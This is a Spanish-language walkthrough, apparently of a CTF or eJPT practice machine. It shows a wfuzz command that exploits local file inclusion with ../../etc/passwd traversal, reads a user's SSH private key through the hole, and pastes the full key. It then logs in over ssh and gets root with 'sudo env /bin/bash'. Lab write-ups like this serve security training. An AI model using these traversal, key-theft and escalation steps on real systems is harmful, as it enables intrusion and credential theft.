- ---
- Tags: #ejptmachine #lfi  
---

![Pasted image 20250125165349](../../Fotos/Pasted%20image%2020250125165349.png)

![Pasted image 20250125165452](../../Fotos/Pasted%20image%2020250125165452.png)

![Pasted image 20250125170138](../../Fotos/Pasted%20image%2020250125170138.png)

**LFI**
`wfuzz -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://172.17.0.2/ejemplos.php?FUZZ=../../../../../etc/passwd  --hl=15`
![Pasted image 20250125171448](../../Fotos/Pasted%20image%2020250125171448.png)

*Otra forma era revisarla URL era bastante intuitiva el LFI*
![Pasted image 20250125171547](../../Fotos/Pasted%20image%2020250125171547.png)

![Pasted image 20250125171616](../../Fotos/Pasted%20image%2020250125171616.png)
- Encontramos un usuario nico

Con fuerza bruta es posible en teoria sacar la clave pero en nuestro caso personal no nos permitio de ninguna manera hasta el momento por ende pasaremos  a otro metodo
![Pasted image 20250125172630](../../Fotos/Pasted%20image%2020250125172630.png)

Enumeraremos par la web mediante LFI la id_rsa del usuario nico
![Pasted image 20250125172926](../../Fotos/Pasted%20image%2020250125172926.png)

![Pasted image 20250125172932](../../Fotos/Pasted%20image%2020250125172932.png)

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

`ssh -i id_rsa -p 22 nico@172.17.0.2`
![Pasted image 20250125180311](../../Fotos/Pasted%20image%2020250125180311.png)

![Pasted image 20250125180341](../../Fotos/Pasted%20image%2020250125180341.png)

`sudo env /bin/bash`
![Pasted image 20250125180454](../../Fotos/Pasted%20image%2020250125180454.png)
